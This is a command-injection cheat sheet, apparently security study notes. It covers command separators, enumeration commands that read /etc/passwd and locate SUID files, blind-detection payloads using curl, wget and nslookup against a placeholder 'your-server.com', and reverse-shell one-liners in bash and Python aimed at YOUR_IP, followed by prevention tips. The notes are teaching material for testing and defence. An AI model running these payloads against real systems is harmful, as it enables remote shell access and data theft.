
---

**What is Command Injection?**
Command Injection is a vulnerability that occurs when a web application passes unsafe user-supplied data to a system shell. The attacker can execute arbitrary operating system commands on the server hosting the application.

---

**Types of Command Injection:**

| | Regular (Verbose) | Blind |
|---|---|---|
| Output shown on page? | ✅ Yes | ❌ No |
| How to detect? | See result directly | Use ping/Wireshark or time delays |
| Danger level | High | High |

---

**Useful Separators to Chain Commands:**
Different separators work on different systems:
```
;        → runs both commands (Linux & Windows)
&&       → runs second only if first succeeds
||       → runs second only if first fails
|        → pipes output of first into second
`cmd`    → backtick execution (Linux)
$(cmd)   → subshell execution (Linux)
& cmd    → runs in background (Windows)
```

---

**Useful Commands for Enumeration After Injection:**

| Goal | Linux | Windows |
|---|---|---|
| Current user | `whoami` | `whoami` |
| Current directory | `pwd` | `cd` |
| List files | `ls -la` | `dir` |
| Network info | `ifconfig` or `ip a` | `ipconfig` |
| Running processes | `ps aux` | `tasklist` |
| OS info | `uname -a` or `lsb_release -a` | `systeminfo` |
| Read a file | `cat /etc/passwd` | `type C:\Windows\win.ini` |
| Find SUID files | `find / -perm -4000 2>/dev/null` | — |

---

**Blind Injection Detection Methods:**

**1. Time-Based (no Wireshark needed):**
```
test; sleep 5
test; ping -c 5 127.0.0.1
```
If the page **takes longer to respond**, the command executed — it's blind injection.

**2. Out-of-Band (using external server):**
```
test; curl http://your-server.com/
test; wget http://your-server.com/
```
Use **webhook.site** or **Burp Collaborator** to catch the incoming request.

**3. DNS-Based:**
```
test; nslookup your-server.com
```
If you receive a DNS lookup on your server — confirmed blind injection.

---

**Escalating Command Injection to a Reverse Shell:**
Once injection is confirmed, you can attempt a reverse shell:

1. Start a listener on your machine:
```
nc -lvnp 4444
```

2. Inject the payload:
```bash
test; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```
or using Python:
```bash
test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

**How to Prevent Command Injection:**
- **Never** pass user input directly to system commands
- Use **allowlists** — only permit specific expected values
- Use language built-in functions instead of shell commands
- Sanitize and **escape** all special characters like `;`, `|`, `&`, `$`
- Run the application with **least privilege** — limit what the server user can do

---

**Important Note:**
Command Injection is ranked in the **OWASP Top 10** as one of the most critical web vulnerabilities. If found during a bug bounty, it is almost always a **Critical** severity finding! 🔥
